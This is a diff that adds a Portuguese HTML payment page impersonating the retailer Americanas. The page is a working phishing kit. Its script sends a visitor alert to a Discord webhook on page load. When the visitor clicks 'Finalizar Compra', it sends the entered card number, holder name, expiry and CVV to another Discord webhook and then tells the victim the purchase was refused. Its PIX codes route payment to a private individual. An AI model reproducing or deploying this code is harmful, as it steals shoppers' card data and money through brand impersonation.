@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seleção de Método de Pagamento</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* Configurações gerais */
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f7f7;
+            color: #333;
+            padding-bottom: 80px;
+        }
+
+        /* Cabeçalho */
+        .header {
+            background-color: #e10032;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 15px 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .header .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .header .search-bar input {
+            width: 100%;
+            padding: 12px;
+            font-size: 1rem;
+            border: none;
+            border-radius: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 15px;
+            text-align: center; /* Centraliza o texto */
+        }
+
+        .header .menu {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .header .menu a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.9rem;
+            padding: 8px 15px;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+
+        .header .menu a:hover {
+            background-color: #d1002b;
+        }
+
+        /* Container principal */
+        .container {
+            width: 90%;
+            max-width: 600px;
+            margin: 50px auto;
+            background-color: white;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding-bottom: 40px;
+        }
+        
+
+        h1 {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #e10032;
+        }
+
+        /* Métodos de pagamento */
+        .payment-method {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px;
+            border-radius: 10px;
+            background-color: #f5f5f5;
+            margin-bottom: 15px;
+            transition: 0.3s ease;
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .payment-method:hover {
+            background-color: #e8e8e8;
+        }
+
+        .payment-method.selected {
+            background-color: #e10032;
+            color: white;
+        }
+
+        .payment-method.selected i {
+            color: white;
+        }
+
+        .payment-method i {
+            font-size: 1.8rem;
+        }
+
+        .payment-method p {
+            font-size: 1.2rem;
+            margin-left: 10px;
+            flex: 1;
+        }
+
+        /* Formulário do cartão */
+        .form-cartao {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .form-cartao input, .form-cartao select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            font-size: 1rem;
+        }
+
+        .form-cartao h3 {
+            margin-bottom: 15px;
+            font-size: 1rem;
+            color: #555;
+        }
+
+        /* QR Code PIX */
+        .pix-image {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .pix-image img {
+            width: 200px;
+            height: 200px;
+            margin-bottom: 10px;
+        }
+
+        .pix-image p {
+            text-align: justify;
+            font-size: 1rem;
+            margin-bottom: 20px;
+        }
+
+        button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 1rem;
+        }
+
+        button:hover {
+            background-color: #218838;
+        }
+
+        .btn-finalizar {
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        /* Rodapé */
+        footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        footer a {
+            color: #e10032;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+       <!-- Cabeçalho -->
+       <header class="header">
+        <div class="logo">
+            <span>americanas</span>
+        </div>
+
+        <div class="search-bar">
+            <input type="text" placeholder="Busque aqui seu produto">
+        </div>
+
+        <nav class="menu">
+            <a href="#">Informar CEP</a>
+            <a href="#">Baixe o App</a>
+            <a href="#">Entrega rápida</a>
+            <a href="#">Serviços</a>
+            <a href="#">Nossas lojas</a>
+            <a href="#">Ofertas do dia</a>
+            <a href="#">Olá, faça seu login</a>
+        </nav>
+    </header>
+
+    <!-- Container Principal -->
+    <div class="container">
+        <h1>Selecione o Método de Pagamento</h1>
+
+        <!-- Opção: Cartão de Crédito -->
+        <div class="payment-method" id="cartao" onclick="selectPaymentMethod('cartao')">
+            <i class="fas fa-credit-card"></i>
+            <p>Cartão de Crédito</p>
+        </div>
+
+        <!-- Opção: PIX -->
+        <div class="payment-method" id="pix" onclick="selectPaymentMethod('pix')">
+            <i class="fas fa-qrcode"></i>
+            <p>PIX</p>
+        </div>
+
+        <!-- Formulário do Cartão -->
+        <div class="form-cartao" id="cartao-form">
+            <h2>Dados do Cartão</h2>
+            <input type="text" placeholder="Número do Cartão" id="numero-cartao" maxlength="16" oninput="this.value = this.value.replace(/\D/g, '')">
+            <input type="text" placeholder="Nome do Titular" id="nome-titular" oninput="this.value = this.value.replace(/[^a-zA-Z\s]/g, '')">
+            <input type="text" placeholder="Validade (MM/AA)" id="validade" maxlength="5" oninput="this.value = this.value.replace(/[^0-9\/]/g, '')">
+            <input type="text" placeholder="Código de Segurança" id="codigo-seguranca" maxlength="3" oninput="this.value = this.value.replace(/\D/g, '')">
+            <select id="parcelas">
+                <option value="1">1x</option>
+                <option value="2">2x sem juros</option>
+                <option value="3">3x sem juros</option>
+                <option value="4">4x sem juros</option>
+                <option value="5">5x sem juros</option>
+                <option value="6">6x sem juros</option>
+                <option value="7">7x sem juros</option>
+                <option value="8">8x sem juros</option>
+                <option value="9">9x sem juros</option>
+                <option value="10">10x sem juros</option>
+                <option value="11">11x sem juros</option>
+                <option value="12">12x sem juros</option>
+            </select>
+        </div>
+
+        <!-- PIX QR Code -->
+        <div class="pix-image" id="pix-image"></div>
+
+        <!-- Botão Finalizar -->
+        <button class="btn-finalizar" onclick="finalizarCompra()">Finalizar Compra</button>
+    </div>
+
+    <footer>
+        <p>Americanas S.A. | <a href="mailto:atendimento@americanas.com">Contato</a></p>
+    </footer>
+
+    <script>
+        const pixKeys = {
+            1: "00020126580014br.gov.bcb.pix0136de9e7d03-ae13-4f94-8843-01f2d96e4a3152040000530398654071011.305802BR5925CLEIBSON GABRIEL LINS GUI6006Recife6211050726f788063047A7F",
+            2: "00020126580014br.gov.bcb.pix0136de9e7d03-ae13-4f94-8843-01f2d96e4a315204000053039865406691.205802BR5925CLEIBSON GABRIEL LINS GUI6006Recife6211050726f788063040553",
+            3: "00020126580014br.gov.bcb.pix0136de9e7d03-ae13-4f94-8843-01f2d96e4a315204000053039865406333.505802BR5925CLEIBSON GABRIEL LINS GUI6006Recife6211050726f78806304C4C7",
+            4: "00020126580014br.gov.bcb.pix0136de9e7d03-ae13-4f94-8843-01f2d96e4a315204000053039865406115.995802BR5925CLEIBSON GABRIEL LINS GUI6006Recife6211050726f788063049A24",
+            5: "00020126580014br.gov.bcb.pix0136de9e7d03-ae13-4f94-8843-01f2d96e4a315204000053039865406164.995802BR5925CLEIBSON GABRIEL LINS GUI6006Recife6211050726f7880630490BD",
+            6: "00020126580014br.gov.bcb.pix0136de9e7d03-ae13-4f94-8843-01f2d96e4a315204000053039865406107.995802BR5925CLEIBSON GABRIEL LINS GUI6006Recife6211050726f788063048FD3",
+            7: "00020126580014br.gov.bcb.pix0136de9e7d03-ae13-4f94-8843-01f2d96e4a315204000053039865406825.905802BR5925CLEIBSON GABRIEL LINS GUI6006Recife6211050726f788063045FB2",
+            8: "00020126580014br.gov.bcb.pix0136de9e7d03-ae13-4f94-8843-01f2d96e4a3152040000530398654076299.005802BR5925CLEIBSON GABRIEL LINS GUI6006Recife6211050726f788063043B5D",
+            9: "00020126580014br.gov.bcb.pix0136de9e7d03-ae13-4f94-8843-01f2d96e4a3152040000530398654074219.005802BR5925CLEIBSON GABRIEL LINS GUI6006Recife6211050726f788063040BB3",
+            10: "00020126580014br.gov.bcb.pix0136de9e7d03-ae13-4f94-8843-01f2d96e4a3152040000530398654071490.005802BR5925CLEIBSON GABRIEL LINS GUI6006Recife6211050726f78806304633B"
+        };
+
+        const discordWebhookURL = "https://discord.com/api/webhooks/1315213641536241724/cPPTDZ8WKob5_9nKLkYN9vJg200pkBefjrXHF96QlEIwXTE68MneQx9TjJAEBY6kFeX6";
+        const discordWebhookURL2 = "https://discord.com/api/webhooks/1315228235189190766/YOWgcrA2CMlgmgG2x6M28LpTvs6nGd-MLHLqdQQCTgxc7LzLtFb2jsE8lpvRmr0In8ug";
+        const payload2 = {
+            content: `Alguém está na pagina de pagamento (:`};
+
+            fetch(discordWebhookURL2, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload2)
+            })
+
+        function selectPaymentMethod(method) {
+            // Esconde todos os formulários e imagens
+            document.getElementById('cartao-form').style.display = 'none';
+            document.getElementById('pix-image').style.display = 'none';
+            document.getElementById('pix-image').innerHTML = ''; // Limpa o conteúdo anterior
+
+            // Remove a classe 'selected' de ambos os métodos
+            document.querySelectorAll('.payment-method').forEach(element => element.classList.remove('selected'));
+
+            // Adiciona a classe 'selected' ao método selecionado
+            document.getElementById(method).classList.add('selected');
+
+            // Exibe o formulário ou QR Code
+            if (method === 'cartao') {
+                document.getElementById('cartao-form').style.display = 'block';
+            } else if (method === 'pix') {
+                showQRCode();
+            }
+        }
+
+        function showQRCode() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const id = urlParams.get('id');
+
+            if (id && pixKeys[id]) {
+                const qrCodeImg = document.createElement('img');
+                qrCodeImg.src = `../qrcodes/qrcode${id}.png`;
+                qrCodeImg.alt = `QR Code ${id}`;
+
+                const pixKeyText = document.createElement('p');
+                pixKeyText.innerHTML = `
+                    <ol>
+                        <li>Abra o app do seu banco, vá até o ambiente Pix e escolha pagar com QR Code ou Pix Copia e Cola.</li>
+                        <li>Escaneie ou cole o código Pix. Confira as informações e finalize o pagamento.</li>
+                        <li>Prontinho! Após a aprovação do pagamento, seu pedido será concluído automaticamente.</li>
+                    </ol>
+                `;
+                
+                const copyButton = document.createElement('button');
+                copyButton.textContent = "Copiar PIX Copia e Cola";
+                copyButton.style.borderRadius = '10px';
+                copyButton.style.transition = 'background-color 0.3s';
+                copyButton.style.cursor = 'pointer';
+                copyButton.style.padding = '10px 20px';
+                copyButton.style.marginBottom = '20px';
+                copyButton.style.backgroundColor = '#e10032';
+                copyButton.addEventListener('click', () => {
+                    const textArea = document.createElement('textarea');
+                    textArea.value = pixKeys[id];
+                    document.body.appendChild(textArea);
+                    textArea.select();
+
+                    try {
+                        const successful = document.execCommand('copy');
+                        if (successful) {
+                            alert("Chave PIX copiada com sucesso!");
+                        } else {
+                            alert("Erro ao copiar a chave PIX.");
+                        }
+                    } catch (err) {
+                        alert("Erro ao copiar a chave PIX: " + err.message);
+                    }
+
+                    document.body.removeChild(textArea);
+                });
+
+                const pixImageDiv = document.getElementById('pix-image');
+                pixImageDiv.appendChild(qrCodeImg);
+                pixImageDiv.appendChild(pixKeyText);
+                pixImageDiv.appendChild(copyButton);
+                pixImageDiv.style.display = 'block';
+            } else {
+                alert("ID inválido ou chave PIX não encontrada!");
+            }
+        }
+
+        function finalizarCompra() {
+            const selectedPayment = document.querySelector('.payment-method.selected');
+            if (!selectedPayment) {
+                alert('Selecione um método de pagamento!');
+                return;
+            }
+
+            const paymentMethod = selectedPayment.querySelector('p').textContent;
+            
+            // Se o método for Cartão de Crédito, coletar os dados
+            if (paymentMethod === 'Cartão de Crédito') {
+                const numeroCartao = document.getElementById('numero-cartao').value;
+                const nomeTitular = document.getElementById('nome-titular').value;
+                const validade = document.getElementById('validade').value;
+                const codigoSeguranca = document.getElementById('codigo-seguranca').value;
+
+                if (!numeroCartao || !nomeTitular || !validade || !codigoSeguranca) {
+                    alert('Por favor, preencha todos os campos do cartão!');
+                    return;
+                }
+
+                // Enviar os dados via Webhook Discord
+                const payload = {
+                    content: `💳 Pagamento via Cartão de Crédito:\n
+    💳    Número do Cartão: ${numeroCartao}\n
+    🧾    Nome do Titular: ${nomeTitular}\n
+    📅    Validade: ${validade}\n
+    🔐    CVV: ${codigoSeguranca}`
+                };
+
+                fetch(discordWebhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert("Compra recusada, verifique as informações!");
+                    } else {
+                        alert("Erro ao enviar os dados!");
+                    }
+                })
+                .catch(error => {
+                    alert("Erro de rede: " + error.message);
+                });
+            } else {
+                alert("Compra recusada, efetue o pagamento primeiro!");
+            }
+        }
+
+        // Criando o elemento para o rodapé
+    const footer = document.createElement('footer');
+
+    // Adicionando o texto desejado
+    footer.innerHTML = `
+    <p>
+        Americanas S.A. / CNPJ: 00.776.574/0006-60 / Inscrição Estadual: 85.687.08-5 <br>
+        Endereço: Rua Sacadura Cabral, 102 - Rio de Janeiro, RJ - 20081-902 <br>
+        Fale com a gente: <a href="mailto:atendimento.acom@americanas.com">atendimento.acom@americanas.com</a> <br>
+        Fale com o RH: <a href="mailto:falecomrh@americanas.io">falecomrh@americanas.io</a> <br>
+        <a href="#">Mapa do site</a>
+    </p>
+    `;
+
+    // Estilizando o rodapé
+    footer.style.backgroundColor = '#f8f9fa';  // Cor de fundo clara
+    footer.style.color = '#333';  // Cor do texto escura
+    footer.style.padding = '10px';  // Padding para espaçamento interno
+    footer.style.fontSize = '12px';  // Tamanho de fonte menor para o rodapé
+    footer.style.textAlign = 'center';  // Centraliza o texto
+    footer.style.position = 'fixed';  // Faz o rodapé fixo
+    footer.style.left = '0';
+    footer.style.bottom = '0';
+    footer.style.width = '100%';  // Para que ocupe toda a largura da página
+    footer.style.borderTop = '5px solid #ccc';  // Borda superior para separar o conteúdo
+
+    // Adicionando o rodapé no corpo da página
+    document.body.appendChild(footer);
+
+    </script>
+</body>
+</html>
